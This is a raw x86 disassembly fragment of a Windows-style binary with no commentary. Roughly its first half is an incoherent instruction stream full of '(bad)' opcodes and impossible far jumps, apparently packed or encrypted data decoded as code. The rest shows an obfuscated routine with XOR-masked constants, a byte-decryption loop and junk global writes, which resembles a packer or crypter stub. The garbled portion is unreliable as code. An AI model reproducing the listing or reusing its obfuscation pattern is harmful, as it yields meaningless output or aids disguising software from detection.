  40c554:	rcr    DWORD PTR [edi+0x44],cl
  40c557:	int3   
  40c558:	aaa    
  40c559:	rcr    BYTE PTR [esi],cl
  40c55b:	rol    BYTE PTR [ebp-0x2cc037cd],1
  40c561:	repnz (bad) 
  40c563:	cld    
  40c564:	in     al,dx
  40c565:	sub    eax,0xf5fde125
  40c56a:	fxch   st(6)
  40c56c:	les    esi,FWORD PTR [eiz*4+0x7e869143]
  40c573:	inc    eax
  40c574:	jmp    0xf676:0x3aca30b9
  40c57b:	ja     0x40c597
  40c57d:	(bad)  
  40c57e:	mov    eax,0x61fa2264
  40c583:	xor    al,0x2d
  40c585:	ins    BYTE PTR es:[edi],dx
  40c586:	es push 0xcc4c2bc7
  40c58c:	mov    bh,0x9b
  40c58e:	lods   eax,DWORD PTR ds:[esi]
  40c58f:	jle    0x40c53e
  40c591:	fisubr DWORD PTR [eax+0x57bc1300]
  40c597:	mov    ebx,0x938405f9
  40c59c:	sub    al,0x11
  40c59e:	adc    DWORD PTR [edx+0x1b1d6c31],ebx
  40c5a4:	push   cs
  40c5a5:	sbb    cl,BYTE PTR ds:0x47a97392
  40c5ab:	ret    0xc3d7
  40c5ae:	add    al,BYTE PTR [edx+0xd]
  40c5b1:	cmp    ch,cl
  40c5b3:	loopne 0x40c5a3
  40c5b5:	out    0xb9,al
  40c5b7:	push   es
  40c5b8:	outs   dx,BYTE PTR ds:[esi]
  40c5b9:	outs   dx,DWORD PTR ds:[esi]
  40c5ba:	test   BYTE PTR [edi+0x78],bh
  40c5bd:	ins    DWORD PTR es:[edi],dx
  40c5be:	pop    esi
  40c5bf:	(bad)  
  40c5c0:	adc    edi,DWORD PTR [eax-0x3c]
  40c5c3:	push   cs
  40c5c4:	pop    esp
  40c5c5:	sub    al,0xa8
  40c5c8:	dec    ecx
  40c5c9:	pop    ebp
  40c5ca:	or     ebp,ebx
  40c5cc:	xlat   BYTE PTR ds:[ebx]
  40c5cd:	push   cs
  40c5ce:	popa   
  40c5cf:	out    0x6e,al
  40c5d1:	sbb    al,0xa2
  40c5d3:	xor    al,0xf7
  40c5d5:	out    0x45,al
  40c5d7:	mov    al,0x61
  40c5d9:	jp     0x40c5e2
  40c5db:	fadd   QWORD PTR [ecx+0x4d]
  40c5de:	scas   al,BYTE PTR es:[edi]
  40c5df:	popa   
  40c5e0:	cwde   
  40c5e1:	mov    esi,0xdda0c889
  40c5e6:	add    eax,DWORD PTR [ecx-0x1d]
  40c5e9:	es mov bh,0x3a
  40c5ec:	jae    0x40c59e
  40c5ee:	xchg   ecx,eax
  40c5ef:	mov    ds:0x9f80a705,al
  40c5f4:	sbb    DWORD PTR [esi+0x47],edi
  40c5f7:	xchg   edx,esi
  40c5f9:	mov    al,fs:0xdcc10485
  40c5ff:	call   0x19b2f661
  40c604:	jbe    0x40c66d
  40c606:	scas   al,BYTE PTR es:[edi]
  40c607:	mov    edi,0x8188218c
  40c60c:	pop    ss
  40c60d:	retf   0xa56
  40c610:	push   0x1c
  40c612:	repz les edx,FWORD PTR [eax-0x3da17718]
  40c619:	div    DWORD PTR [edx+0x1faafeb6]
  40c61f:	xor    eax,0x7dfd0ca6
  40c624:	ret    0xcee4
  40c627:	cdq    
  40c628:	scas   eax,DWORD PTR es:[edi]
  40c629:	(bad)  [edi-0xd]
  40c62c:	cmp    dl,BYTE PTR [ecx]
  40c62e:	xchg   esp,eax
  40c62f:	pminsw mm7,QWORD PTR ds:0xb5e06218
  40c636:	sbb    eax,0xd3a47fc
  40c63b:	out    0xca,al
  40c63d:	icebp  
  40c63e:	out    dx,eax
  40c63f:	dec    ecx
  40c640:	jmp    0x40c5d6
  40c642:	xor    edx,DWORD PTR [edi-0x52c48fe4]
  40c648:	mov    bl,0x92
  40c64a:	mov    ah,0x29
  40c64c:	jg     0x40c60f
  40c64e:	inc    edx
  40c64f:	pop    ds
  40c650:	dec    edx
  40c651:	push   ecx
  40c652:	mov    esp,0x8629308e
  40c657:	ret    0xb600
  40c65a:	aad    0xb4
  40c65c:	fadd   DWORD PTR [edx+edi*4+0x4f]
  40c660:	push   ebp
  40c661:	nop
  40c662:	imul   edi,DWORD PTR [ecx],0x23
  40c665:	out    dx,al
  40c666:	jnp    0x40c626
  40c668:	jnp    0x40c627
  40c66a:	fwait
  40c66b:	mov    ecx,0x9d9ad2c3
  40c670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c671:	inc    ecx
  40c672:	push   ebx
  40c673:	mov    bl,0x6d
  40c675:	mov    dh,0x4a
  40c677:	in     eax,0x8a
  40c679:	addr16 nop
  40c67b:	push   ebx
  40c67c:	sar    DWORD PTR [edi+0x69],cl
  40c67f:	push   0x7a
  40c681:	mul    DWORD PTR [ebx-0x7a4ddee8]
  40c687:	inc    esi
  40c688:	es and dl,al
  40c68b:	jne    0x40c6b3
  40c68d:	scas   eax,DWORD PTR es:[edi]
  40c68e:	mov    al,ds:0xd98d60cb
  40c693:	div    DWORD PTR [ecx]
  40c695:	gs adc eax,0xcc4ec442
  40c69b:	sahf   
  40c69c:	pop    esp
  40c69d:	int3   
  40c69e:	hlt    
  40c69f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6a0:	ins    BYTE PTR es:[edi],dx
  40c6a1:	cmp    BYTE PTR [ebx],ch
  40c6a3:	xchg   DWORD PTR [edx+ebp*1],esi
  40c6a6:	inc    ebp
  40c6a7:	mov    bh,0x54
  40c6a9:	xchg   ebx,eax
  40c6aa:	loope  0x40c669
  40c6ac:	les    esp,FWORD PTR [esi-0x43]
  40c6af:	add    eax,esi
  40c6b1:	cdq    
  40c6b2:	pop    ds
  40c6b3:	les    esi,FWORD PTR [eax-0x71]
  40c6b6:	stos   BYTE PTR es:[edi],al
  40c6b7:	and    al,0x62
  40c6b9:	aad    0xc6
  40c6bb:	add    eax,0x8b4db8b6
  40c6c0:	xor    BYTE PTR [edi+eiz*8+0xe],ch
  40c6c4:	adc    BYTE PTR [edx+0x7368e681],0x37
  40c6cb:	addr16 add ah,bl
  40c6ce:	shl    BYTE PTR [edi+0x533d2d58],0x30
  40c6d5:	push   es
  40c6d6:	push   ss
  40c6d7:	or     ecx,esp
  40c6d9:	cmp    BYTE PTR [edi+0x50],0xa0
  40c6dd:	daa    
  40c6de:	outs   dx,DWORD PTR ds:[esi]
  40c6df:	fiadd  DWORD PTR [edx+edx*2+0x58]
  40c6e3:	inc    esp
  40c6e4:	fcomp  QWORD PTR [edi+edi*1]
  40c6e7:	pop    ebx
  40c6e8:	sbb    eax,0xdd75748
  40c6ed:	jge    0x40c744
  40c6ef:	and    al,0x56
  40c6f1:	fs xchg ebx,eax
  40c6f3:	ret    
  40c6f4:	loopne 0x40c67d
  40c6f6:	hlt    
  40c6f7:	push   ebx
  40c6f8:	pop    es
  40c6f9:	add    BYTE PTR gs:[ebp-0x6c61d155],dl
  40c700:	ret    
  40c701:	jbe    0x40c759
  40c703:	sub    edi,0xffffffc1
  40c706:	inc    DWORD PTR [edx+0x8a5d2a4]
  40c70c:	jmp    0xe01c:0xe3aa08c5
  40c713:	stos   DWORD PTR es:[edi],eax
  40c714:	dec    esp
  40c715:	mov    bh,0xeb
  40c717:	cmp    BYTE PTR ds:[eax+edi*2-0x16007082],0xb
  40c720:	or     BYTE PTR [edx-0x9],dl
  40c723:	push   ebx
  40c724:	mov    ebp,0x4d5165b4
  40c729:	es mov al,0xe2
  40c72c:	add    eax,0x41c44ec5
  40c731:	mov    ecx,0x39123e98
  40c736:	mov    ss,ebx
  40c738:	push   ss
  40c739:	jne    0x40c77d
  40c73b:	loopne 0x40c740
  40c73d:	div    eax
  40c73f:	cmc    
  40c740:	push   ebp
  40c741:	lods   eax,DWORD PTR ds:[esi]
  40c742:	ins    DWORD PTR es:[edi],dx
  40c743:	dec    ebx
  40c744:	xor    ebx,DWORD PTR [eax]
  40c746:	mov    ds:0x980e2e8d,al
  40c74b:	push   cs
  40c74c:	fnsave [edx-0x69]
  40c74f:	xor    esi,DWORD PTR [ecx]
  40c751:	enter  0x2a22,0xe4
  40c755:	pop    esp
  40c756:	inc    DWORD PTR [ebx-0x5465f0d0]
  40c75c:	test   DWORD PTR [ebx],eax
  40c75e:	cdq    
  40c75f:	xor    ch,BYTE PTR [ecx]
  40c761:	inc    esp
  40c762:	retfw  0x7b82
  40c766:	add    BYTE PTR [eax-0x387f87c1],dh
  40c76c:	mov    ecx,0xc388a97c
  40c771:	addr16 pop ecx
  40c773:	rcr    edx,0x7b
  40c776:	push   0x3a
  40c778:	xchg   ecx,eax
  40c779:	sub    dl,BYTE PTR [ebx]
  40c77b:	adc    bh,BYTE PTR [ecx+0x70aba22a]
  40c781:	fild   QWORD PTR [ecx-0x687db152]
  40c787:	cmp    DWORD PTR [eax-0x70e44555],0xb89477cb
  40c791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c792:	es (bad) 
  40c794:	cs xor eax,0x19a6283b
  40c79a:	std    
  40c79b:	pop    es
  40c79c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c79d:	into   
  40c79e:	mov    al,ds:0xcc69ee7
  40c7a3:	scas   eax,DWORD PTR es:[edi]
  40c7a4:	sub    al,dl
  40c7a6:	mov    bh,0xd1
  40c7a8:	push   esi
  40c7a9:	pop    ds
  40c7aa:	xor    esp,DWORD PTR [esi-0x42d4be03]
  40c7b0:	cmp    BYTE PTR [ebx+ebx*8+0x2a283ccb],bl
  40c7b7:	int3   
  40c7b8:	scas   al,BYTE PTR es:[edi]
  40c7b9:	push   edi
  40c7ba:	(bad)  
  40c7bb:	cmp    al,0xee
  40c7bd:	dec    ecx
  40c7be:	dec    ecx
  40c7bf:	jp     0x40c767
  40c7c1:	fwait
  40c7c2:	inc    ecx
  40c7c3:	loope  0x40c795
  40c7c5:	outs   dx,DWORD PTR ds:[esi]
  40c7c6:	xor    BYTE PTR [esi+0x53],0x1
  40c7ca:	xchg   ebp,eax
  40c7cb:	adc    BYTE PTR [edx],dl
  40c7cd:	sbb    al,0xbc
  40c7cf:	xor    eax,0xe101621e
  40c7d4:	lahf   
  40c7d5:	scas   al,BYTE PTR es:[edi]
  40c7d6:	cmp    al,0x14
  40c7d8:	mov    bh,0x83
  40c7da:	and    eax,0x56afbe90
  40c7df:	jne    0x40c84a
  40c7e1:	mov    al,BYTE PTR [ebx+0x61]
  40c7e4:	sti    
  40c7e5:	inc    edx
  40c7e6:	call   DWORD PTR [ebp-0x66]
  40c7ea:	lock loopne 0x40c777
  40c7ed:	fdiv   DWORD PTR [edx-0x1312d7b]
  40c7f3:	mov    edi,cs
  40c7f5:	push   eax
  40c7f6:	xchg   edx,eax
  40c7f7:	pop    edi
  40c7f8:	pop    edx
  40c7f9:	push   ss
  40c7fa:	xchg   DWORD PTR [ecx-0x41fa1933],esi
  40c800:	lahf   
  40c801:	fstp   DWORD PTR [ecx+0x56]
  40c804:	pop    edx
  40c805:	pop    ebp
  40c806:	pop    edi
  40c807:	bound  ebx,QWORD PTR [edx]
  40c809:	cmp    edx,edx
  40c80b:	ficom  WORD PTR [edi+0x18]
  40c80e:	ret    0xdaae
  40c811:	pop    ss
  40c812:	jns    0x40c7f2
  40c814:	inc    ecx
  40c815:	aad    0x34
  40c817:	popa   
  40c818:	ja     0x40c893
  40c81a:	fcomp  QWORD PTR [edx+esi*1]
  40c81d:	popf   
  40c81e:	outs   dx,DWORD PTR ds:[esi]
  40c81f:	pop    ss
  40c820:	test   DWORD PTR [edi+eiz*4],esp
  40c823:	daa    
  40c824:	les    ebx,FWORD PTR [ebp+0x160d7c31]
  40c82a:	jle    0x40c83e
  40c82c:	sahf   
  40c82d:	xchg   esp,eax
  40c82e:	xor    eax,0xaa58288c
  40c833:	(bad)  
  40c834:	test   bh,0x40
  40c837:	ret    
  40c838:	add    bh,BYTE PTR [ebx+0x17e031ea]
  40c83e:	cmp    DWORD PTR [eax],edx
  40c840:	push   ebp
  40c841:	setle  BYTE PTR [esi]
  40c844:	inc    esi
  40c845:	jmp    0x40c873
  40c847:	cmp    edi,eax
  40c849:	mov    eax,ds:0xb00be262
  40c84e:	dec    esp
  40c84f:	scas   eax,DWORD PTR es:[edi]
  40c850:	lock gs jb 0x40c83d
  40c854:	mov    edx,0xd0a0a497
  40c859:	std    
  40c85a:	xchg   ebx,eax
  40c85b:	fwait
  40c85c:	jecxz  0x40c88e
  40c85e:	or     edi,ebx
  40c860:	mov    DWORD PTR [esi-0x37],ebx
  40c863:	shr    BYTE PTR [ebp-0x336b5c71],1
  40c869:	call   0xf275647
  40c86e:	pop    ax
  40c870:	std    
  40c871:	call   0x9a83:0xd14608ce
  40c878:	(bad)  
  40c879:	dec    ebx
  40c87a:	mov    ah,0xd7
  40c87c:	adc    al,BYTE PTR [ebx+0x2fb382ad]
  40c882:	sbb    esi,ecx
  40c884:	cmc    
  40c885:	add    ah,BYTE PTR [eax-0x6ceb0e03]
  40c88b:	jmp    0xd40cf907
  40c890:	call   0x5030ccb8
  40c895:	cmp    BYTE PTR [ebx+0x77],0x42
  40c899:	and    eax,0xfe1a9e00
  40c89e:	arpl   WORD PTR [edi+0x1c],di
  40c8a1:	xor    cl,BYTE PTR [ebx]
  40c8a3:	xor    dh,ch
  40c8a5:	mov    ?,WORD PTR [ebp-0x3b]
  40c8a8:	adc    ch,ch
  40c8aa:	pop    ebx
  40c8ab:	daa    
  40c8ac:	cmp    bh,dh
  40c8ae:	ins    BYTE PTR es:[edi],dx
  40c8af:	in     eax,dx
  40c8b0:	add    eax,0x5a4fea11
  40c8b5:	into   
  40c8b6:	cmp    al,0x7a
  40c8b8:	sub    al,0x78
  40c8ba:	jo     0x40c89a
  40c8bc:	hlt    
  40c8bd:	lods   al,BYTE PTR ds:[esi]
  40c8be:	xlat   BYTE PTR ds:[ebx]
  40c8bf:	test   eax,0x1fc64902
  40c8c4:	sbb    eax,DWORD PTR [edi-0x38e17155]
  40c8ca:	mov    esp,0xaef9b65e
  40c8cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8d0:	lea    eax,[ecx-0x360f119c]
  40c8d6:	push   0x78240935
  40c8db:	loopne 0x40c860
  40c8dd:	movd   DWORD PTR [ebp+0x6a],mm0
  40c8e1:	lea    ebx,[edi+0x56f246b9]
  40c8e7:	xchg   ecx,eax
  40c8e8:	lock jno 0x40c941
  40c8eb:	sbb    eax,0x801fb4d9
  40c8f0:	mov    ebx,0x66ea4bf0
  40c8f5:	lea    ecx,[esi-0x53]
  40c8f8:	add    eax,0x7e7a2067
  40c8fd:	mov    ah,0xa0
  40c8ff:	cmp    al,0x43
  40c901:	(bad)  
  40c902:	mov    esi,0xaaebce1c
  40c907:	shr    DWORD PTR [edi-0x27],1
  40c90a:	int3   
  40c90b:	sar    edx,0xd1
  40c90e:	pop    eax
  40c90f:	scas   al,BYTE PTR es:[edi]
  40c910:	loopne 0x40c8fd
  40c912:	aaa    
  40c913:	sub    esi,DWORD PTR [edi+0x309573f4]
  40c919:	int    0x2b
  40c91b:	mov    bl,0x95
  40c91d:	std    
  40c91e:	lds    edx,FWORD PTR [eax-0x4c]
  40c921:	xchg   edx,eax
  40c922:	adc    ebx,ebp
  40c924:	retf   0xa614
  40c927:	ret    0x20da
  40c92a:	loop   0x40c98e
  40c92c:	mov    edx,0xe0f8c367
  40c931:	fwait
  40c932:	sahf   
  40c933:	into   
  40c934:	daa    
  40c935:	sbb    BYTE PTR [ebx+0x7c],dh
  40c938:	push   cs
  40c939:	and    esi,DWORD PTR [esi]
  40c93b:	outs   dx,DWORD PTR ds:[esi]
  40c93c:	ins    BYTE PTR es:[edi],dx
  40c93d:	sbb    ah,BYTE PTR [ebx+0x3d71cd09]
  40c943:	jp     0x40c8f6
  40c945:	mov    ds:0xaeb42e70,eax
  40c94a:	scas   eax,DWORD PTR es:[edi]
  40c94b:	fwait
  40c94c:	pop    ebp
  40c94d:	sbb    eax,0x9e010a6f
  40c952:	scas   al,BYTE PTR es:[edi]
  40c953:	cmp    eax,0x931dae02
  40c958:	inc    esp
  40c959:	popf   
  40c95a:	aaa    
  40c95b:	rcr    ebp,cl
  40c95d:	dec    esp
  40c95e:	sub    dl,BYTE PTR [ebx+0xe55f3f7]
  40c964:	or     DWORD PTR [ebx+0x2ab8821c],esp
  40c96a:	adc    edi,0x49cab579
  40c970:	fmul   DWORD PTR [edx+eiz*2]
  40c973:	inc    edi
  40c974:	stc    
  40c975:	dec    ebx
  40c976:	pushf  
  40c977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c978:	adc    DWORD PTR [edx],ebx
  40c97a:	cmc    
  40c97b:	mov    bl,BYTE PTR [edx+esi*8-0x5fcdd96c]
  40c982:	dec    esi
  40c983:	push   0xfffffff7
  40c985:	pop    ss
  40c986:	jle    0x40c92b
  40c988:	cdq    
  40c989:	or     bh,BYTE PTR [ecx]
  40c98b:	iret   
  40c98c:	call   0xd9785bd2
  40c991:	sbb    ebx,esi
  40c993:	int    0x42
  40c995:	not    DWORD PTR [ebp-0x289ba14]
  40c99b:	rol    DWORD PTR ds:0xe6414f,1
  40c9a1:	jl     0x40c993
  40c9a3:	icebp  
  40c9a4:	xchg   ecx,eax
  40c9a5:	aam    0xb
  40c9a7:	xchg   edx,eax
  40c9a8:	stc    
  40c9a9:	xchg   esp,esi
  40c9ab:	adc    eax,0x4ccd6c52
  40c9b0:	cmp    DWORD PTR ds:0xae351f86,ecx
  40c9b6:	in     eax,0x76
  40c9b8:	(bad)  
  40c9b9:	aas    
  40c9ba:	cwde   
  40c9bb:	adc    BYTE PTR [ebp-0x4a829ea2],cl
  40c9c1:	imul   DWORD PTR [ebx-0x63]
  40c9c4:	and    DWORD PTR [ecx],ecx
  40c9c6:	fisubr DWORD PTR [esp+ecx*1-0x6948e87a]
  40c9cd:	fwait
  40c9ce:	and    esi,edx
  40c9d0:	js     0x40c9d4
  40c9d2:	aam    0x69
  40c9d4:	sub    ebp,DWORD PTR [edi]
  40c9d6:	inc    esp
  40c9d7:	pushf  
  40c9d8:	leave  
  40c9d9:	cmp    DWORD PTR [esi],0xffffffa4
  40c9dc:	retf   
  40c9dd:	(bad)  
  40c9de:	pop    esi
  40c9df:	push   eax
  40c9e0:	sub    DWORD PTR [edi],edi
  40c9e2:	push   es
  40c9e3:	cld    
  40c9e4:	gs popf 
  40c9e6:	mov    esi,0xd7127306
  40c9eb:	inc    eax
  40c9ec:	cmp    ebp,DWORD PTR [ebp+0x18208752]
  40c9f2:	pop    ebp
  40c9f3:	(bad)  
  40c9f4:	data16 out 0x6e,al
  40c9f7:	scas   eax,DWORD PTR es:[edi]
  40c9f8:	xor    eax,DWORD PTR [edi]
  40c9fa:	fdiv   QWORD PTR [ecx+0xabf2b76]
  40ca00:	mov    al,ds:0x3a25c32d
  40ca05:	lea    edx,[ecx+0x32]
  40ca08:	push   esi
  40ca09:	pop    esp
  40ca0a:	lds    ebx,FWORD PTR [edx]
  40ca0c:	jae    0x40c9e9
  40ca0e:	shr    DWORD PTR [edx+0x762529ab],0x43
  40ca15:	mov    dh,0x29
  40ca17:	jmp    0x40ca54
  40ca19:	les    esp,FWORD PTR [ebx+0x36]
  40ca1c:	adc    eax,0xe62cc2d3
  40ca21:	dec    ebx
  40ca22:	int3   
  40ca23:	xor    eax,esi
  40ca25:	add    eax,edi
  40ca27:	cmp    edx,eax
  40ca29:	je     0x40cb90
  40ca2f:	mov    eax,DWORD PTR [ebp-0x8]
  40ca32:	mov    DWORD PTR [ebp-0x18],eax
  40ca35:	mov    eax,DWORD PTR [ebp-0x10]
  40ca38:	add    eax,DWORD PTR [ebp-0x54]
  40ca3b:	mov    DWORD PTR [ebp-0x1c],0xf89c85b0
  40ca42:	mov    DWORD PTR [ebp-0x8],eax
  40ca45:	mov    eax,0xf89c85b1
  40ca4a:	mov    DWORD PTR [ebp-0x28],eax
  40ca4d:	mov    DWORD PTR [ebp-0x5c],0xf89c85b2
  40ca54:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  40ca5b:	mov    DWORD PTR [ebp-0x30],eax
  40ca5e:	mov    eax,DWORD PTR [ebp-0x1c]
  40ca61:	xor    eax,esi
  40ca63:	add    eax,edi
  40ca65:	jmp    0x40cb4c
  40ca6a:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  40ca71:	mov    DWORD PTR [ebp-0x50],0xf89c858e
  40ca78:	mov    eax,DWORD PTR [ebp-0x30]
  40ca7b:	mov    edx,DWORD PTR [ebp-0xc]
  40ca7e:	xor    eax,esi
  40ca80:	add    eax,edi
  40ca82:	imul   eax,edx
  40ca85:	mov    edx,DWORD PTR [ebp-0x8]
  40ca88:	mov    al,BYTE PTR [eax+edx*1]
  40ca8b:	mov    BYTE PTR [ebp-0x1],al
  40ca8e:	mov    eax,DWORD PTR [ebp-0x30]
  40ca91:	mov    edx,DWORD PTR [ebp-0xc]
  40ca94:	xor    eax,esi
  40ca96:	add    eax,edi
  40ca98:	imul   eax,edx
  40ca9b:	mov    edx,DWORD PTR [ebp-0x5c]
  40ca9e:	xor    edx,esi
  40caa0:	add    eax,edx
  40caa2:	mov    edx,DWORD PTR [ebp-0x8]
  40caa5:	movzx  eax,BYTE PTR [eax+edx*1+0x3272ec]
  40caad:	mov    edx,DWORD PTR [ebp-0x4c]
  40cab0:	xor    edx,esi
  40cab2:	lea    eax,[edx+eax*1+0x3272ec]
  40cab9:	movzx  edx,BYTE PTR [ebp-0x1]
  40cabd:	xor    edx,eax
  40cabf:	mov    BYTE PTR [ebp-0x1],dl
  40cac2:	mov    al,BYTE PTR [ebp-0x1]
  40cac5:	mov    edx,DWORD PTR [ebp-0x30]
  40cac8:	mov    ebx,DWORD PTR [ebp-0xc]
  40cacb:	xor    edx,esi
  40cacd:	add    edx,edi
  40cacf:	imul   edx,ebx
  40cad2:	mov    ebx,DWORD PTR [ebp-0x8]
  40cad5:	mov    BYTE PTR [edx+ebx*1],al
  40cad8:	mov    eax,DWORD PTR [ebp-0x30]
  40cadb:	mov    edx,DWORD PTR [ebp-0xc]
  40cade:	xor    eax,esi
  40cae0:	add    eax,edi
  40cae2:	imul   eax,edx
  40cae5:	mov    edx,DWORD PTR [ebp-0x8]
  40cae8:	mov    al,BYTE PTR [eax+edx*1]
  40caeb:	mov    BYTE PTR [ebp-0x1],al
  40caee:	mov    eax,DWORD PTR [ebp-0x30]
  40caf1:	mov    edx,DWORD PTR [ebp-0xc]
  40caf4:	xor    eax,esi
  40caf6:	add    eax,edi
  40caf8:	imul   eax,edx
  40cafb:	mov    edx,DWORD PTR [ebp-0x28]
  40cafe:	xor    edx,esi
  40cb00:	add    eax,edx
  40cb02:	mov    edx,DWORD PTR [ebp-0x8]
  40cb05:	movzx  eax,BYTE PTR [eax+edx*1+0x3272ec]
  40cb0d:	mov    edx,DWORD PTR [ebp-0x50]
  40cb10:	xor    edx,esi
  40cb12:	lea    eax,[edx+eax*1+0x3272ec]
  40cb19:	movzx  edx,BYTE PTR [ebp-0x1]
  40cb1d:	xor    edx,eax
  40cb1f:	mov    BYTE PTR [ebp-0x1],dl
  40cb22:	mov    al,BYTE PTR [ebp-0x1]
  40cb25:	mov    edx,DWORD PTR [ebp-0x30]
  40cb28:	mov    ebx,DWORD PTR [ebp-0xc]
  40cb2b:	xor    edx,esi
  40cb2d:	add    edx,edi
  40cb2f:	imul   edx,ebx
  40cb32:	mov    ebx,DWORD PTR [ebp-0x8]
  40cb35:	mov    BYTE PTR [edx+ebx*1],al
  40cb38:	mov    eax,DWORD PTR [ebp-0x40]
  40cb3b:	mov    edx,DWORD PTR [ebp-0x28]
  40cb3e:	xor    eax,esi
  40cb40:	xor    edx,esi
  40cb42:	add    eax,edi
  40cb44:	add    edx,edi
  40cb46:	imul   eax,edx
  40cb49:	add    eax,DWORD PTR [ebp-0xc]
  40cb4c:	mov    DWORD PTR [ebp-0xc],eax
  40cb4f:	mov    eax,DWORD PTR [ebp-0xc]
  40cb52:	mov    edx,DWORD PTR [ebp-0x18]
  40cb55:	cmp    edx,eax
  40cb57:	jb     0x40ca6a
  40cb5d:	mov    eax,DWORD PTR [ebp-0x28]
  40cb60:	mov    edx,DWORD PTR [ebp-0x18]
  40cb63:	xor    eax,esi
  40cb65:	add    eax,edi
  40cb67:	imul   eax,edx
  40cb6a:	mov    edx,DWORD PTR [ebp-0x1c]
  40cb6d:	xor    edx,esi
  40cb6f:	add    edx,edi
  40cb71:	or     eax,edx
  40cb73:	mov    edx,DWORD PTR [ebp-0x20]
  40cb76:	xor    edx,esi
  40cb78:	add    eax,edx
  40cb7a:	mov    edx,DWORD PTR [ebp-0x20]
  40cb7d:	xor    edx,esi
  40cb7f:	add    eax,edx
  40cb81:	mov    edx,DWORD PTR [ebp-0x10]
  40cb84:	lea    eax,[eax+edx*1+0x64e5d8]
  40cb8b:	jmp    0x40cb9f
  40cb90:	mov    eax,DWORD PTR [ebp-0x20]
  40cb93:	mov    edx,DWORD PTR [ebp-0x10]
  40cb96:	xor    eax,esi
  40cb98:	lea    eax,[eax+edx*1+0x3272ec]
  40cb9f:	mov    DWORD PTR [ebp-0x10],eax
  40cba2:	jmp    0x4082ff
  40cba7:	mov    ebx,DWORD PTR [ebp-0x3c]
  40cbaa:	mov    eax,DWORD PTR [ebp+0xc]
  40cbad:	xor    eax,esi
  40cbaf:	lea    ecx,[ecx+eax*1+0x3272ec]
  40cbb6:	lea    eax,[ecx-0x3272ec]
  40cbbc:	xor    eax,esi
  40cbbe:	cmp    eax,0xf89c95b0
  40cbc3:	jne    0x405f47
  40cbc9:	dec    DWORD PTR [ebp-0x34]
  40cbcc:	jne    0x405f3b
  40cbd2:	mov    eax,DWORD PTR [ebp+0x8]
  40cbd5:	mov    ecx,DWORD PTR [ebp+0xc]
  40cbd8:	mov    edx,DWORD PTR [ebp+0x8]
  40cbdb:	xor    ecx,esi
  40cbdd:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272ec]
  40cbe4:	xor    eax,esi
  40cbe6:	mov    al,BYTE PTR [eax+ebx*1+0x3272ec]
  40cbed:	xor    edx,esi
  40cbef:	mov    BYTE PTR [edx+ebx*1+0x3272ec],cl
  40cbf6:	mov    ecx,DWORD PTR [ebp+0xc]
  40cbf9:	xor    ecx,esi
  40cbfb:	mov    BYTE PTR [ecx+ebx*1+0x3272ec],al
  40cc02:	mov    eax,DWORD PTR [ebp+0xc]
  40cc05:	xor    eax,esi
  40cc07:	add    eax,edi
  40cc09:	pop    edi
  40cc0a:	pop    esi
  40cc0b:	pop    ebx
  40cc0c:	leave  
  40cc0d:	ret    0x8
  40cc10:	xor    eax,eax
  40cc12:	inc    eax
  40cc13:	ret    
  40cc14:	push   ebp
  40cc15:	mov    ebp,esp
  40cc17:	sub    esp,0x38
  40cc1a:	mov    eax,ds:0x42d01c
  40cc1f:	sbb    DWORD PTR ds:0x42c014,eax
  40cc25:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  40cc2c:	add    eax,DWORD PTR ds:0x429018
  40cc32:	push   ebx
  40cc33:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  40cc3a:	xor    DWORD PTR ds:0x42a014,ebx
  40cc40:	mov    eax,DWORD PTR [ebp-0x4]
  40cc43:	push   esi
  40cc44:	mov    esi,DWORD PTR ds:0x429020
  40cc4a:	or     esi,DWORD PTR ds:0x42d01c
  40cc50:	mov    DWORD PTR ds:0x429020,esi
  40cc56:	mov    esi,0x75108a4
  40cc5b:	xor    DWORD PTR ds:0x42a01c,0x42b018
  40cc65:	xor    eax,esi
  40cc67:	and    DWORD PTR ds:0x429014,0x42c01c
  40cc71:	push   edi
  40cc72:	mov    edi,0x3272ec
  40cc77:	add    eax,edi
  40cc79:	or     DWORD PTR ds:0x42b014,0x42a008
  40cc83:	mov    DWORD PTR [ebp-0x1c],eax
  40cc86:	sub    eax,DWORD PTR ds:0x42900c
  40cc8c:	mov    eax,DWORD PTR [ebp+0x14]
  40cc8f:	sbb    DWORD PTR ds:0x42c010,0x42d01c
  40cc99:	test   eax,eax
  40cc9b:	mov    DWORD PTR ds:0x42d018,0x202a
  40cca5:	je     0x40ccb9
  40ccab:	mov    eax,DWORD PTR [ebp+0x14]
  40ccae:	adc    ebx,0xa49
  40ccb4:	mov    eax,DWORD PTR [eax]
  40ccb6:	mov    DWORD PTR [ebp-0x1c],eax
  40ccb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbc:	sub    ebx,0x2794
  40ccc2:	xor    eax,esi
  40ccc4:	mov    DWORD PTR ds:0x42c008,0x10
  40ccce:	cmp    DWORD PTR ds:0x42c008,0x0
  40ccd5:	je     0x40cd41
  40ccdb:	cmp    DWORD PTR ds:0x42c008,0x9
  40cce2:	jl     0x40cd41
  40cce8:	jmp    0x40cd13
  40cced:	push   0x3f9f
  40ccf2:	push   DWORD PTR [ebp-0x20]
  40ccf5:	push   DWORD PTR [ebp-0x24]
  40ccf8:	push   0x35ef
  40ccfd:	push   DWORD PTR [ebp-0x1c]
  40cd00:	push   DWORD PTR [ebp-0x14]
  40cd03:	push   0x24ee
  40cd08:	push   0x42f016
  40cd0d:	call   DWORD PTR ds:0x430047
  40cd13:	cmp    DWORD PTR ds:0x42c008,0xa
  40cd1a:	jne    0x40cd2f
  40cd20:	xor    ebx,ebx
  40cd22:	add    ebx,DWORD PTR ds:0x42c008
  40cd28:	dec    ebx
  40cd29:	mov    DWORD PTR ds:0x42c008,ebx
  40cd2f:	mov    ebx,DWORD PTR ds:0x42c008
  40cd35:	dec    ebx
  40cd36:	mov    DWORD PTR ds:0x42c008,ebx
  40cd3c:	jmp    0x40ccce
  40cd41:	add    eax,edi
  40cd43:	adc    ebx,0x57bc
